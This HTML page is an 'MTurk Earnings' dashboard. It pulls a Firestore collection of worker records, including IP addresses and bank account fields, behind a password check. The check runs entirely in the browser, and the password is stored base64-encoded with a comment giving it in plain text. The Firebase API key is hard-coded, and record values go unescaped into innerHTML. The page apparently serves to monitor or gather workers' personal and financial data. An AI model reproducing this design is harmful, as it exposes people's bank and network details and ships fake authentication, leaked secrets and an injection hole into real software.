<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>üîí MTurk Earnings ‚Äî Protected Viewer</title>
  <style>
    body {
      font-family: Inter, Roboto, Arial, sans-serif;
      background: #f4f6f8;
      color: #111;
      text-align: center;
      padding: 40px;
    }
    h2 {
      margin-top: 0;
    }
    .hidden { display: none; }
    #passwordBox {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
      display: inline-block;
      margin-bottom: 50px;
    }
    #passInput {
      padding: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      width: 200px;
      text-align: center;
    }
    #unlockBtn {
      padding: 10px 20px;
      background: #111827;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    #protected {
      max-width: 1100px;
      margin: 0 auto;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
      padding: 20px 30px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      font-size: 14px;
    }
    th, td {
      border: 1px solid #ddd;
      padding: 8px;
      text-align: center;
    }
    th {
      background: #111827;
      color: #fff;
    }
    button {
      padding: 8px 16px;
      background: #111827;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
    }
    #status {
      margin-top: 10px;
      font-weight: 600;
    }
    #loadStatus {
      margin-top: 10px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <!-- üîê Password Section -->
  <div id="passwordBox">
    <h2>üîí Secure Access</h2>
    <p>Enter password to view dashboard</p>
    <input type="password" id="passInput" placeholder="Enter password" />
    <br><br>
    <button id="unlockBtn">Unlock</button>
    <p id="status"></p>
  </div>

  <!-- üìä Dashboard Section -->
  <div id="protected" class="hidden">
    <h2>üìä MTurk Earnings Dashboard</h2>
    <table>
      <thead>
        <tr>
          <th>Worker ID</th>
          <th>User</th>
          <th>IP</th>
          <th>Current Earnings</th>
          <th>Bank</th>
          <th>Next Transfer</th>
          <th>Last Month Transfer</th>
          <th>Alert</th>
          <th>Timestamp</th>
        </tr>
      </thead>
      <tbody id="earnBody"></tbody>
    </table>
    <button id="csvExport">‚¨áÔ∏è Export to CSV</button>
    <p id="loadStatus">Loading data...</p>
  </div>

  <!-- üîß Firebase Logic -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
    import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCCtBCAJvQCDj8MXb2w90qYUqRrENIIGIQ",
      authDomain: "mturk-monitordeep.firebaseapp.com",
      projectId: "mturk-monitordeep",
      storageBucket: "mturk-monitordeep.firebasestorage.app",
      messagingSenderId: "58392297487",
      appId: "1:58392297487:web:1365ad12110ffd0586637a"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const encPass = "QUIyRUFSTklOR1MyMDI1"; // base64 for AB2EARNINGS2025
    const decodePass = atob(encPass);

    const passBox = document.getElementById("passwordBox");
    const protectedDiv = document.getElementById("protected");
    const passInput = document.getElementById("passInput");
    const statusEl = document.getElementById("status");

    document.getElementById("unlockBtn").onclick = () => {
      if (passInput.value === decodePass) {
        passBox.classList.add("hidden");
        protectedDiv.classList.remove("hidden");
        loadData();
      } else {
        statusEl.textContent = "‚ùå Wrong password";
        statusEl.style.color = "red";
      }
    };

    async function loadData() {
      const loadStatus = document.getElementById("loadStatus");
      const tbody = document.getElementById("earnBody");
      tbody.innerHTML = "";
      try {
        const snapshot = await getDocs(collection(db, "earnings_logs"));
        if (snapshot.empty) {
          loadStatus.textContent = "‚ö†Ô∏è No records found in Firebase.";
          return;
        }
        snapshot.forEach(doc => {
          const d = doc.data();
          const tr = document.createElement("tr");
          tr.innerHTML = `
            <td>${d.workerId || ""}</td>
            <td>${d.user || ""}</td>
            <td>${d.ip || ""}</td>
            <td>${d.currentEarnings || ""}</td>
            <td>${d.bankAccount || ""}</td>
            <td>${d.nextTransferDate || ""}</td>
            <td>${d.lastMonthTransfer || ""}</td>
            <td style="color:${d.alert ? 'red':'green'}">${d.alert || "‚úÖ OK"}</td>
            <td>${d.timestamp?.toDate ? d.timestamp.toDate().toLocaleString() : d.timestamp || ""}</td>`;
          tbody.appendChild(tr);
        });
        loadStatus.textContent = "‚úÖ Data loaded successfully.";
      } catch (err) {
        loadStatus.textContent = "‚ùå Firestore fetch error: " + err.message;
        loadStatus.style.color = "red";
      }
    }

    document.getElementById("csvExport").onclick = () => {
      const rows = [...document.querySelectorAll("table tr")]
        .map(r => [...r.children].map(c => `"${c.innerText}"`).join(","))
        .join("\n");
      const blob = new Blob([rows], { type: "text/csv" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "earnings_logs.csv";
      a.click();
    };
  </script>
</body>
</html>
